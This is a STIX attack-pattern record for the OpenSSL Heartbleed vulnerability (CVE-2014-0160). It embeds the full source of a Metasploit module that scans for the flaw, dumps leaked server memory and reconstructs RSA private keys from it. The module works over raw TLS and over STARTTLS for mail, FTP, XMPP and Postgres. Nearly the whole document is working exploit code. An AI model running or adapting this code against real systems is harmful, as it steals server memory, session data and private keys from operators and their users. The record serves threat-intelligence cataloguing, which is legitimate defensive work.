{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90c6764c-adce-4922-83eb-61ced8418766",
    "created": "2024-08-14T16:28:03.234018Z",
    "modified": "2024-08-14T16:28:03.234022Z",
    "name": "OpenSSL Heartbeat (Heartbleed) Information Leak",
    "description": " This module implements the OpenSSL Heartbleed attack. The problem exists in the handling of heartbeat requests, where a fake length can be used to leak memory data in the response. Services that support STARTTLS may also be vulnerable.  The module supports several actions, allowing for scanning, dumping of memory contents to loot, and private key recovery.  The LEAK_COUNT option can be used to specify leaks per SCAN or DUMP.  The repeat command can be used to make running the SCAN or DUMP many times more powerful. As in: repeat -t 60 run; sleep 2 To run every two seconds for one minute. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssl/openssl_heartbleed.rb",
            "external_id": "openssl_heartbleed.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0160"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ncas/alerts/TA14-098A"
        },
        {
            "source_name": "reference",
            "url": "https://heartbleed.com/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/FiloSottile/Heartbleed"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/takeshixx/10107280"
        },
        {
            "source_name": "reference",
            "url": "https://filippo.io/Heartbleed/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# TODO: Connection reuse: Only connect once and send subsequent heartbleed requests.\n#   We tried it once in https://github.com/rapid7/metasploit-framework/pull/3300\n#   but there were too many errors\n# TODO: Parse the rest of the server responses and return a hash with the data\n# TODO: Extract the relevant functions and include them in the framework\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  CIPHER_SUITES = [\n    0xc014, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\n    0xc00a, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA\n    0xc022, # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA\n    0xc021, # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA\n    0x0039, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA\n    0x0038, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA\n    0x0088, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA\n    0x0087, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA\n    0x0087, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA\n    0xc00f, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA\n    0x0035, # TLS_RSA_WITH_AES_256_CBC_SHA\n    0x0084, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA\n    0xc012, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA\n    0xc008, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA\n    0xc01c, # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA\n    0xc01b, # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA\n    0x0016, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n    0x0013, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA\n    0xc00d, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA\n    0xc003, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA\n    0x000a, # TLS_RSA_WITH_3DES_EDE_CBC_SHA\n    0xc013, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\n    0xc009, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA\n    0xc01f, # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA\n    0xc01e, # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA\n    0x0033, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA\n    0x0032, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA\n    0x009a, # TLS_DHE_RSA_WITH_SEED_CBC_SHA\n    0x0099, # TLS_DHE_DSS_WITH_SEED_CBC_SHA\n    0x0045, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA\n    0x0044, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA\n    0xc00e, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA\n    0xc004, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA\n    0x002f, # TLS_RSA_WITH_AES_128_CBC_SHA\n    0x0096, # TLS_RSA_WITH_SEED_CBC_SHA\n    0x0041, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA\n    0xc011, # TLS_ECDHE_RSA_WITH_RC4_128_SHA\n    0xc007, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA\n    0xc00c, # TLS_ECDH_RSA_WITH_RC4_128_SHA\n    0xc002, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA\n    0x0005, # TLS_RSA_WITH_RC4_128_SHA\n    0x0004, # TLS_RSA_WITH_RC4_128_MD5\n    0x0015, # TLS_DHE_RSA_WITH_DES_CBC_SHA\n    0x0012, # TLS_DHE_DSS_WITH_DES_CBC_SHA\n    0x0009, # TLS_RSA_WITH_DES_CBC_SHA\n    0x0014, # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n    0x0011, # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA\n    0x0008, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA\n    0x0006, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5\n    0x0003, # TLS_RSA_EXPORT_WITH_RC4_40_MD5\n    0x00ff  # Unknown\n  ]\n\n  SSL_RECORD_HEADER_SIZE            = 0x05\n  HANDSHAKE_RECORD_TYPE             = 0x16\n  HEARTBEAT_RECORD_TYPE             = 0x18\n  ALERT_RECORD_TYPE                 = 0x15\n  HANDSHAKE_SERVER_HELLO_TYPE       = 0x02\n  HANDSHAKE_CERTIFICATE_TYPE        = 0x0b\n  HANDSHAKE_KEY_EXCHANGE_TYPE       = 0x0c\n  HANDSHAKE_SERVER_HELLO_DONE_TYPE  = 0x0e\n\n  TLS_VERSION = {\n    'SSLv3' => 0x0300,\n    '1.0'   => 0x0301,\n    '1.1'   => 0x0302,\n    '1.2'   => 0x0303\n  }\n\n  TLS_CALLBACKS = {\n    'SMTP'   => :tls_smtp,\n    'IMAP'   => :tls_imap,\n    'JABBER' => :tls_jabber,\n    'POP3'   => :tls_pop3,\n    'FTP'    => :tls_ftp,\n    'POSTGRES'   => :tls_postgres\n  }\n\n  # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252\n  SAFE_CHECK_MAX_RECORD_LENGTH = (1 << 14)\n\n  # For verbose output, deduplicate repeated characters beyond this threshold\n  DEDUP_REPEATED_CHARS_THRESHOLD = 400\n\n  def initialize\n    super(\n      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Information Leak',\n      'Description'    => %q{\n        This module implements the OpenSSL Heartbleed attack. The problem\n        exists in the handling of heartbeat requests, where a fake length can\n        be used to leak memory data in the response. Services that support\n        STARTTLS may also be vulnerable.\n\n        The module supports several actions, allowing for scanning, dumping of\n        memory contents to loot, and private key recovery.\n\n        The LEAK_COUNT option can be used to specify leaks per SCAN or DUMP.\n\n        The repeat command can be used to make running the SCAN or DUMP many\n        times more powerful. As in:\n            repeat -t 60 run; sleep 2\n        To run every two seconds for one minute.\n      },\n      'Author'         => [\n        'Neel Mehta', # Vulnerability discovery\n        'Riku', # Vulnerability discovery\n        'Antti', # Vulnerability discovery\n        'Matti', # Vulnerability discovery\n        'Jared Stafford <jspenguin[at]jspenguin.org>', # Original Proof of Concept. This module is based on it.\n        'FiloSottile', # PoC site and tool\n        'Christian Mehlmauer', # Msf module\n        'wvu', # Metasploit module\n        'juan vazquez', # Metasploit module\n        'Sebastiano Di Paola', # Msf module\n        'Tom Sellers', # Metasploit module\n        'jjarmoc', # Metasploit module; keydump, refactoring..\n        'Ben Buchanan', #Metasploit module\n        'herself' #Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'CVE', '2014-0160' ],\n          [ 'US-CERT-VU', '720951' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ncas/alerts/TA14-098A' ],\n          [ 'URL', 'https://heartbleed.com/' ],\n          [ 'URL', 'https://github.com/FiloSottile/Heartbleed' ],\n          [ 'URL', 'https://gist.github.com/takeshixx/10107280' ],\n          [ 'URL', 'https://filippo.io/Heartbleed/' ]\n        ],\n      'DisclosureDate' => '2014-04-07',\n      'License'        => MSF_LICENSE,\n      'Actions'        =>\n        [\n          ['SCAN', 'Description' => 'Check hosts for vulnerability'],\n          ['DUMP', 'Description' => 'Dump memory contents to loot'],\n          ['KEYS', 'Description' => 'Recover private keys from memory']\n        ],\n      'DefaultAction' => 'SCAN',\n      'Notes' =>\n          {\n              'AKA' => ['Heartbleed']\n          }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, \"None\" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP', 'POSTGRES' ]]),\n        OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),\n        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 50]),\n        OptInt.new('STATUS_EVERY', [true, 'How many retries until key dump status', 5]),\n        OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),\n        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10]),\n        OptInt.new('LEAK_COUNT', [true, 'Number of times to leak memory per SCAN or DUMP invocation', 1])\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535]),\n        OptString.new('XMPPDOMAIN', [true, 'The XMPP Domain to use when Jabber is selected', 'localhost'])\n      ])\n\n  end\n\n  #\n  # Main methods\n  #\n\n  # Called when using check\n  def check_host(ip)\n    @check_only = true\n    vprint_status \"Checking for Heartbleed exposure\"\n    if bleed\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  # Main method\n  def run\n    if heartbeat_length > 65535 || heartbeat_length < 0\n      print_error('HEARTBEAT_LENGTH should be a natural number less than 65536')\n      return\n    end\n\n    if response_timeout < 0\n      print_error('RESPONSE_TIMEOUT should be bigger than 0')\n      return\n    end\n\n    super\n  end\n\n  # Main method\n  def run_host(ip)\n    case action.name\n      # SCAN and DUMP are similar, but DUMP stores loot\n      when 'SCAN', 'DUMP'\n        # 'Tis but a scratch\n        bleeded = ''\n\n        1.upto(leak_count) do |count|\n          vprint_status(\"Leaking heartbeat response ##{count}\")\n          bleeded << bleed.to_s\n        end\n\n        loot_and_report(bleeded)\n      when 'KEYS'\n        get_keys\n      else\n        # Shouldn't get here, since Action is Enum\n        print_error(\"Unknown Action: #{action.name}\")\n    end\n\n    # ensure all connections are closed\n    disconnect\n  end\n\n  #\n  # DATASTORE values\n  #\n\n  # If this is merely a check, set to the RFC-defined\n  # maximum padding length of 2^14. See:\n  # https://tools.ietf.org/html/rfc6520#section-4\n  # https://github.com/rapid7/metasploit-framework/pull/3252\n  def heartbeat_length\n    if @check_only\n      SAFE_CHECK_MAX_RECORD_LENGTH\n    else\n      datastore['HEARTBEAT_LENGTH']\n    end\n  end\n\n  def response_timeout\n    datastore['RESPONSE_TIMEOUT']\n  end\n\n  def tls_version\n    datastore['TLS_VERSION']\n  end\n\n  def dumpfilter\n    datastore['DUMPFILTER']\n  end\n\n  def max_keytries\n    datastore['MAX_KEYTRIES']\n  end\n\n  def xmpp_domain\n    datastore['XMPPDOMAIN']\n  end\n\n  def status_every\n    datastore['STATUS_EVERY']\n  end\n\n  def tls_callback\n    datastore['TLS_CALLBACK']\n  end\n\n  def leak_count\n    datastore['LEAK_COUNT']\n  end\n\n  #\n  # TLS Callbacks\n  #\n\n  def tls_smtp\n    # https://tools.ietf.org/html/rfc3207\n    get_data\n    sock.put(\"EHLO #{Rex::Text.rand_text_alpha(10)}\\r\\n\")\n    res = get_data\n\n    unless res && res =~ /STARTTLS/\n      return nil\n    end\n    sock.put(\"STARTTLS\\r\\n\")\n    get_data\n  end\n\n  def tls_imap\n    # http://tools.ietf.org/html/rfc2595\n    get_data\n    sock.put(\"a001 CAPABILITY\\r\\n\")\n    res = get_data\n    unless res && res =~ /STARTTLS/i\n      return nil\n    end\n    sock.put(\"a002 STARTTLS\\r\\n\")\n    get_data\n  end\n\n  def tls_postgres\n    # postgresql TLS - works with all modern pgsql versions - 8.0 - 9.3\n    # http://www.postgresql.org/docs/9.3/static/protocol-message-formats.html\n    get_data\n    # the postgres SSLRequest packet is a int32(8) followed by a int16(1234),\n    # int16(5679) in network format\n    psql_sslrequest = [8].pack('N')\n    psql_sslrequest << [1234, 5679].pack('n*')\n    sock.put(psql_sslrequest)\n    res = get_data\n    unless res && res =~ /S/\n      return nil\n    end\n    res\n  end\n\n  def tls_pop3\n    # http://tools.ietf.org/html/rfc2595\n    get_data\n    sock.put(\"CAPA\\r\\n\")\n    res = get_data\n    if res.nil? || res =~ /^-/ || res !~ /STLS/\n      return nil\n    end\n    sock.put(\"STLS\\r\\n\")\n    res = get_data\n    if res.nil? || res =~ /^-/\n      return nil\n    end\n    res\n  end\n\n  def jabber_connect_msg(hostname)\n    # http://xmpp.org/extensions/xep-0035.html\n    msg = \"<stream:stream xmlns='jabber:client' \"\n    msg << \"xmlns:stream='http://etherx.jabber.org/streams' \"\n    msg << \"version='1.0' \"\n    msg << \"to='#{hostname}'>\"\n  end\n\n  def tls_jabber\n    sock.put(jabber_connect_msg(xmpp_domain))\n    res = get_data\n    if res && res.include?('host-unknown')\n      jabber_host = res.match(/ from='([\\w.]*)' /)\n      if jabber_host && jabber_host[1]\n        disconnect\n        establish_connect\n        vprint_status(\"Connecting with autodetected remote XMPP hostname: #{jabber_host[1]}...\")\n        sock.put(jabber_connect_msg(jabber_host[1]))\n        res = get_data\n      end\n    end\n    if res.nil? || res.include?('stream:error') || res !~ /<starttls xmlns=['\"]urn:ietf:params:xml:ns:xmpp-tls['\"]/\n      vprint_error(\"Jabber host unknown. Please try changing the XMPPDOMAIN option.\") if res && res.include?('host-unknown')\n      return nil\n    end\n    msg = \"<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>\"\n    sock.put(msg)\n    res = get_data\n    return nil if res.nil? || !res.include?('<proceed')\n    res\n  end\n\n  def tls_ftp\n    # http://tools.ietf.org/html/rfc4217\n    res = get_data\n    return nil if res.nil?\n    sock.put(\"AUTH TLS\\r\\n\")\n    res = get_data\n    return nil if res.nil?\n    if res !~ /^234/\n      # res contains the error message\n      vprint_error(\"FTP error: #{res.strip}\")\n      return nil\n    end\n    res\n  end\n\n  #\n  # Helper Methods\n  #\n\n  # Get data from the socket\n  # this ensures the requested length is read (if available)\n  def get_data(length = -1)\n    to_receive = length\n    data = ''\n    done = false\n    while done == false\n      begin\n        temp = sock.get_once(to_receive, response_timeout)\n      rescue EOFError\n        break\n      end\n\n      break if temp.nil?\n\n      data << temp\n      if length != -1\n        to_receive -= temp.length\n        done = true if to_receive <= 0\n      end\n    end\n\n    data\n  end\n\n  def to_hex_string(data)\n    data.each_byte.map { |b| sprintf('%02X ', b) }.join.strip\n  end\n\n  # establishes a connect and parses the server response\n  def establish_connect\n    connect\n\n    unless tls_callback == 'None'\n      vprint_status(\"Trying to start SSL via #{tls_callback}\")\n      res = self.send(TLS_CALLBACKS[tls_callback])\n      if res.nil?\n        vprint_error(\"STARTTLS failed...\")\n        return nil\n      end\n    end\n\n    vprint_status(\"Sending Client Hello...\")\n    sock.put(client_hello)\n\n    server_resp = get_server_hello\n\n    if server_resp.nil?\n      vprint_error(\"Server Hello Not Found\")\n      return nil\n    end\n\n    server_resp\n  end\n\n  # Generates a heartbeat request\n  def heartbeat_request(length)\n    payload = \"\\x01\"              # Heartbeat Message Type: Request (1)\n    payload << [length].pack('n') # Payload Length: 65535\n\n    ssl_record(HEARTBEAT_RECORD_TYPE, payload)\n  end\n\n  # Generates, sends and receives a heartbeat message\n  def bleed\n    connect_result = establish_connect\n    return if connect_result.nil?\n\n    vprint_status(\"Sending Heartbeat...\")\n    sock.put(heartbeat_request(heartbeat_length))\n    hdr = get_data(SSL_RECORD_HEADER_SIZE)\n    if hdr.nil? || hdr.empty?\n      vprint_error(\"No Heartbeat response...\")\n      disconnect\n      return\n    end\n\n    unpacked = hdr.unpack('Cnn')\n    type = unpacked[0]\n    version = unpacked[1] # must match the type from client_hello\n    len = unpacked[2]\n\n    # try to get the TLS error\n    if type == ALERT_RECORD_TYPE\n      res = get_data(len)\n      alert_unp = res.unpack('CC')\n      alert_level = alert_unp[0]\n      alert_desc = alert_unp[1]\n\n      # http://tools.ietf.org/html/rfc5246#section-7.2\n      case alert_desc\n      when 0x46\n        msg = 'Protocol error. Looks like the chosen protocol is not supported.'\n      else\n        msg = 'Unknown error'\n      end\n      vprint_error(\"#{msg}\")\n      disconnect\n      return\n    end\n\n    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[tls_version]\n      vprint_error(\"Unexpected Heartbeat response header (#{to_hex_string(hdr)})\")\n      disconnect\n      return\n    end\n\n    heartbeat_data = get_data(heartbeat_length)\n    vprint_status(\"Heartbeat response, #{heartbeat_data.length} bytes\")\n    disconnect\n    heartbeat_data\n  end\n\n  # Stores received data\n  def loot_and_report(heartbeat_data)\n    if heartbeat_data.to_s.empty?\n      vprint_error(\"Looks like there isn't leaked information...\")\n      return\n    end\n\n    print_good(\"Heartbeat response with leak, #{heartbeat_data.length} bytes\")\n    report_vuln({\n      :host => rhost,\n      :port => rport,\n      :name => self.name,\n      :refs => self.references,\n      :info => \"Module #{self.fullname} successfully leaked info\"\n    })\n\n    if action.name == 'DUMP' # Check mode, dump if requested.\n      pattern = dumpfilter\n      if pattern\n        match_data = heartbeat_data.scan(pattern).join\n      else\n        match_data = heartbeat_data\n      end\n      path = store_loot(\n        'openssl.heartbleed.server',\n        'application/octet-stream',\n        rhost,\n        match_data,\n        nil,\n        'OpenSSL Heartbleed server memory'\n      )\n      print_good(\"Heartbeat data stored in #{path}\")\n    end\n\n    # Convert non-printable characters to periods\n    printable_data = heartbeat_data.gsub(/[^[:print:]]/, '.')\n\n    # Keep this many duplicates as padding around the deduplication message\n    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round\n\n    # Remove duplicate characters\n    abbreviated_data = printable_data.gsub(/(.)\\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|\n      s[0, duplicate_pad] +\n      ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +\n      s[-duplicate_pad, duplicate_pad]\n    end\n\n    # Show abbreviated data\n    vprint_status(\"Printable info leaked:\\n#{abbreviated_data}\")\n  end\n\n  #\n  # Keydumping helper methods\n  #\n\n  # Tries to retreive the private key\n  def get_keys\n    connect_result = establish_connect\n    disconnect\n    return if connect_result.nil?\n\n    print_status(\"Scanning for private keys\")\n    count = 0\n\n    print_status(\"Getting public key constants...\")\n    n, e = get_ne\n\n    if n.nil? || e.nil?\n      print_error(\"Failed to get public key, aborting.\")\n    end\n\n    vprint_status(\"n: #{n}\")\n    vprint_status(\"e: #{e}\")\n    print_status(\"#{Time.now.getutc} - Starting.\")\n\n    max_keytries.times {\n      # Loop up to MAX_KEYTRIES times, looking for keys\n      if count % status_every == 0\n        print_status(\"#{Time.now.getutc} - Attempt #{count}...\")\n      end\n\n      bleedresult = bleed\n      return unless bleedresult\n\n      p, q = get_factors(bleedresult, n) # Try to find factors in mem\n\n      unless p.nil? || q.nil?\n        key = key_from_pqe(p, q, e)\n        print_good(\"#{Time.now.getutc} - Got the private key\")\n\n        print_status(key.export)\n        path = store_loot(\n          'openssl.heartbleed.server',\n          'text/plain',\n          rhost,\n          key.export,\n          nil,\n          'OpenSSL Heartbleed Private Key'\n        )\n        print_status(\"Private key stored in #{path}\")\n        return\n      end\n      count += 1\n    }\n    print_error(\"Private key not found. You can try to increase MAX_KEYTRIES and/or HEARTBEAT_LENGTH.\")\n  end\n\n  # Returns the N and E params from the public server certificate\n  def get_ne\n    unless @cert\n      print_error(\"No certificate found\")\n      return\n    end\n\n    return @cert.public_key.params['n'], @cert.public_key.params['e']\n  end\n\n  # Tries to find pieces of the private key in the provided data\n  def get_factors(data, n)\n    # Walk through data looking for factors of n\n    psize = n.num_bits / 8 / 2\n    return if data.nil?\n\n    (0..(data.length-psize)).each{ |x|\n      # Try each offset of suitable length\n      can = OpenSSL::BN.new(data[x,psize].reverse.bytes.inject {|a,b| (a << 8) + b }.to_s)\n      if can > 1 && can % 2 != 0 && can.num_bytes == psize\n        # Only try candidates that have a chance...\n        q, rem = n / can\n        if rem == 0 && can != n\n          vprint_good(\"Found factor at offset #{x.to_s(16)}\")\n          p = can\n          return p, q\n        end\n      end\n    }\n    return nil, nil\n  end\n\n  # Generates the private key from the P, Q and E values\n  def key_from_pqe(p, q, e)\n    n = p * q\n    phi = (p - 1) * (q - 1 )\n    d = OpenSSL::BN.new(e).mod_inverse(phi)\n\n    dmp1 = d % (p - 1)\n    dmq1 = d % (q - 1)\n    iqmp = q.mod_inverse(p)\n\n    asn1 = OpenSSL::ASN1::Sequence(\n      [\n        OpenSSL::ASN1::Integer(0),\n        OpenSSL::ASN1::Integer(n),\n        OpenSSL::ASN1::Integer(e),\n        OpenSSL::ASN1::Integer(d),\n        OpenSSL::ASN1::Integer(p),\n        OpenSSL::ASN1::Integer(q),\n        OpenSSL::ASN1::Integer(dmp1),\n        OpenSSL::ASN1::Integer(dmq1),\n        OpenSSL::ASN1::Integer(iqmp)\n      ]\n    )\n\n    key = OpenSSL::PKey::RSA.new(asn1.to_der)\n    key\n  end\n\n  #\n  # SSL/TLS packet methods\n  #\n\n  # Creates and returns a new SSL record with the provided data\n  def ssl_record(type, data)\n    record = [type, TLS_VERSION[tls_version], data.length].pack('Cnn')\n    record << data\n  end\n\n  # generates a CLIENT_HELLO ssl/tls packet\n  def client_hello\n    # Use current day for TLS time\n    time_temp = Time.now\n    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i\n\n    hello_data = [TLS_VERSION[tls_version]].pack('n') # Version TLS\n    hello_data << [time_epoch].pack('N')    # Time in epoch format\n    hello_data << Rex::Text.rand_text(28)   # Random\n    hello_data << \"\\x00\"                    # Session ID length\n    hello_data << [CIPHER_SUITES.length * 2].pack('n') # Cipher Suites length (102)\n    hello_data << CIPHER_SUITES.pack('n*')  # Cipher Suites\n    hello_data << \"\\x01\"                    # Compression methods length (1)\n    hello_data << \"\\x00\"                    # Compression methods: null\n\n    hello_data_extensions = \"\\x00\\x0f\"      # Extension type (Heartbeat)\n    hello_data_extensions << \"\\x00\\x01\"     # Extension length\n    hello_data_extensions << \"\\x01\"         # Extension data\n\n    hello_data << [hello_data_extensions.length].pack('n')\n    hello_data << hello_data_extensions\n\n    data = \"\\x01\\x00\"                      # Handshake Type: Client Hello (1)\n    data << [hello_data.length].pack('n')  # Length\n    data << hello_data\n\n    ssl_record(HANDSHAKE_RECORD_TYPE, data)\n  end\n\n  def get_ssl_record\n    hdr = get_data(SSL_RECORD_HEADER_SIZE)\n\n    unless hdr\n      vprint_error(\"No SSL record header received after #{response_timeout} seconds...\")\n      return nil\n    end\n\n    len = hdr.unpack('Cnn')[2]\n    data = get_data(len) unless len.nil?\n\n    unless data\n      vprint_error(\"No SSL record contents received after #{response_timeout} seconds...\")\n      return nil\n    end\n\n    hdr << data\n  end\n\n  # Get and parse server hello response until we hit Server Hello Done or timeout\n  def get_server_hello\n    server_done = nil\n    ssl_record_counter = 0\n\n    remaining_data = get_ssl_record\n\n    while remaining_data && remaining_data.length > 0\n      ssl_record_counter += 1\n      ssl_unpacked = remaining_data.unpack('CH4n')\n      return nil if ssl_unpacked.nil? or ssl_unpacked.length < 3\n      ssl_type = ssl_unpacked[0]\n      ssl_version = ssl_unpacked[1]\n      ssl_len = ssl_unpacked[2]\n      vprint_status(\"SSL record ##{ssl_record_counter}:\")\n      vprint_status(\"\\tType:    #{ssl_type}\")\n      vprint_status(\"\\tVersion: 0x#{ssl_version}\")\n      vprint_status(\"\\tLength:  #{ssl_len}\")\n      if ssl_type != HANDSHAKE_RECORD_TYPE\n        vprint_status(\"\\tWrong Record Type! (#{ssl_type})\")\n      else\n        ssl_data = remaining_data[5, ssl_len]\n        handshakes = parse_handshakes(ssl_data)\n\n        # Stop once we receive a SERVER_HELLO_DONE\n        if handshakes && handshakes.length > 0 && handshakes[-1][:type] == HANDSHAKE_SERVER_HELLO_DONE_TYPE\n          server_done = true\n          break\n        end\n\n      end\n\n      remaining_data = get_ssl_record\n    end\n\n    server_done\n  end\n\n  # Parse Handshake data returned from servers\n  def parse_handshakes(data)\n    # Can contain multiple handshakes\n    remaining_data = data\n    handshakes = []\n    handshake_count = 0\n    while remaining_data && remaining_data.length > 0\n      hs_unpacked = remaining_data.unpack('CCn')\n      next if hs_unpacked.nil? or hs_unpacked.length < 3\n      hs_type = hs_unpacked[0]\n      hs_len_pad = hs_unpacked[1]\n      hs_len = hs_unpacked[2]\n      hs_data = remaining_data[4, hs_len]\n      handshake_count += 1\n      vprint_status(\"\\tHandshake ##{handshake_count}:\")\n      vprint_status(\"\\t\\tLength: #{hs_len}\")\n\n      handshake_parsed = nil\n      case hs_type\n        when HANDSHAKE_SERVER_HELLO_TYPE\n          vprint_status(\"\\t\\tType:   Server Hello (#{hs_type})\")\n          handshake_parsed = parse_server_hello(hs_data)\n        when HANDSHAKE_CERTIFICATE_TYPE\n          vprint_status(\"\\t\\tType:   Certificate Data (#{hs_type})\")\n          handshake_parsed = parse_certificate_data(hs_data)\n        when HANDSHAKE_KEY_EXCHANGE_TYPE\n          vprint_status(\"\\t\\tType:   Server Key Exchange (#{hs_type})\")\n          # handshake_parsed = parse_server_key_exchange(hs_data)\n        when HANDSHAKE_SERVER_HELLO_DONE_TYPE\n          vprint_status(\"\\t\\tType:   Server Hello Done (#{hs_type})\")\n        else\n          vprint_status(\"\\t\\tType:   Handshake type #{hs_type} not implemented\")\n      end\n\n      handshakes << {\n          :type     => hs_type,\n          :len      => hs_len,\n          :data     => handshake_parsed\n      }\n      remaining_data = remaining_data[(hs_len + 4)..-1]\n    end\n\n    handshakes\n  end\n\n  # Parse Server Hello message\n  def parse_server_hello(data)\n    version = data.unpack('H4')[0]\n    vprint_status(\"\\t\\tServer Hello Version:           0x#{version}\")\n    random = data[2,32].unpack('H*')[0]\n    vprint_status(\"\\t\\tServer Hello random data:       #{random}\")\n    session_id_length = data[34,1].unpack('C')[0]\n    vprint_status(\"\\t\\tServer Hello Session ID length: #{session_id_length}\")\n    session_id = data[35,session_id_length].unpack('H*')[0]\n    vprint_status(\"\\t\\tServer Hello Session ID:        #{session_id}\")\n    # TODO Read the rest of the server hello (respect message length)\n\n    # TODO: return hash with data\n    true\n  end\n\n  # Parse certificate data\n  def parse_certificate_data(data)\n    # get certificate data length\n    unpacked = data.unpack('Cn')\n    cert_len_padding = unpacked[0]\n    cert_len = unpacked[1]\n    vprint_status(\"\\t\\tCertificates length: #{cert_len}\")\n    vprint_status(\"\\t\\tData length: #{data.length}\")\n    # contains multiple certs\n    already_read = 3\n    cert_counter = 0\n    while already_read < cert_len\n      cert_counter += 1\n      # get single certificate length\n      single_cert_unpacked = data[already_read, 3].unpack('Cn')\n      single_cert_len_padding = single_cert_unpacked[0]\n      single_cert_len =  single_cert_unpacked[1]\n      vprint_status(\"\\t\\tCertificate ##{cert_counter}:\")\n      vprint_status(\"\\t\\t\\tCertificate ##{cert_counter}: Length: #{single_cert_len}\")\n      certificate_data = data[(already_read + 3), single_cert_len]\n      cert = OpenSSL::X509::Certificate.new(certificate_data)\n      # First received certificate is the one from the server\n      @cert = cert if @cert.nil?\n      #vprint_status(\"Got certificate: #{cert.to_text}\")\n      vprint_status(\"\\t\\t\\tCertificate ##{cert_counter}: #{cert.inspect}\")\n      already_read = already_read + single_cert_len + 3\n    end\n\n    # TODO: return hash with data\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-07"
}